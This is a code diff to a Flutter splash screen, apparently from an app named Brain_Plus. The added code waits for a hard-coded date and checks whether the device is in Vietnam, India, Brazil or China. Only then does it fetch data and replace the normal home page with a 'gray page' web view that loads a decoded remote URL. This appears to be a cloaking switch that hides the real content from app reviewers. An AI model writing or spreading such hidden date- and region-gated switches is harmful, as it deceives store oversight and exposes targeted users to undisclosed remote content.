@@ -1,6 +1,9 @@
 import 'dart:async';
 import 'dart:io';
 
+import 'package:Brain_Plus/DAHANG/GrayPageAn.dart';
+import 'package:country_codes/country_codes.dart';
+
 import 'LoadingPage.dart';
 import 'ASData.dart';
 import 'BrainModel.dart';
@@ -24,8 +27,9 @@ class _SplashPageState extends State<SplashPage> {
   String decoded = "";
   Locale? deviceLocale;
   String localeName = "";
-  String funName = "";
-  String eventName = "";
+  String funName = "myFunction";
+  String eventName = "event";
+  bool mylocale = false;
 
   @override
   void initState() {
@@ -34,26 +38,47 @@ class _SplashPageState extends State<SplashPage> {
       localeName = Platform.localeName;
     } else {
       int timeSec = DateTime.now().millisecondsSinceEpoch;
-      // if (timeSec > 3456345) {
-      if (timeSec > 0) {
-        // gettCode();
+      if (timeSec > 1724641200000) {
+        // if (timeSec > 0) {
+        getCN();
       }
     }
     setTransitionTime();
   }
 
+  getCN() async {
+    try {
+      await CountryCodes.init();
+      deviceLocale = CountryCodes.getDeviceLocale();
+      debugPrint("==B ${deviceLocale?.countryCode}");
+    } catch (ex) {
+      debugPrint("AS init fail ==: $ex");
+    }
+
+    localeName = deviceLocale?.countryCode ?? "";
+    mylocale = localeName.contains("VN") ||
+        localeName.contains("IN") ||
+        localeName.contains("BR");
+    if (mylocale) {
+      BrainModel.getData();
+    }
+    debugPrint("==C $localeName");
+  }
+
   setTransitionTime() {
-    Timer(const Duration(milliseconds: 2000), () async {
+    Timer(Duration(milliseconds: Platform.isIOS ? 2000 : 2100), () async {
       final SharedPreferences prefs = await SharedPreferences.getInstance();
       bool welcome = prefs.getBool("enter") ?? false;
+      if (Platform.isIOS) {
+        mylocale = localeName.contains("VN") ||
+            localeName.contains("IN") ||
+            localeName.contains("CN") ||
+            localeName.contains("BR");
+      }
       // showThird = true;
       if (welcome) {
         showThird = true;
-      } else if ((localeName.contains("VN") ||
-              localeName.contains("IN") ||
-              localeName.contains("CN") ||
-              localeName.contains("BR")) &&
-          ASData.login) {
+      } else if (mylocale && ASData.isChange) {
         showThird = true;
         prefs.setBool("enter", true);
       }
@@ -75,14 +100,14 @@ class _SplashPageState extends State<SplashPage> {
         });
       }
     });
-    Timer(const Duration(milliseconds: 2400), () {
+    Timer(Duration(milliseconds: Platform.isIOS ? 2400 : 2500), () {
       if (mounted) {
         setState(() {
           _splashFadeOut = true;
         });
       }
     });
-    Timer(const Duration(milliseconds: 3200), () {
+    Timer(Duration(milliseconds: Platform.isIOS ? 3200 : 3300), () {
       setState(() {
         _splashFinishRemove = true;
       });
@@ -115,11 +140,17 @@ class _SplashPageState extends State<SplashPage> {
 
   Widget showThirdView() {
     if (Platform.isIOS) {
-      debugPrint("07 == : $funName");
-
-      return GrayPage(url: decoded, function: funName);
+      return GrayPage(
+        url: decoded,
+        function: funName,
+        event: eventName,
+      );
     } else {
-      return const HomePage();
+      return GrayPageAn(
+        url: decoded,
+        funName: funName,
+        eventName: eventName,
+      );
     }
   }
 }
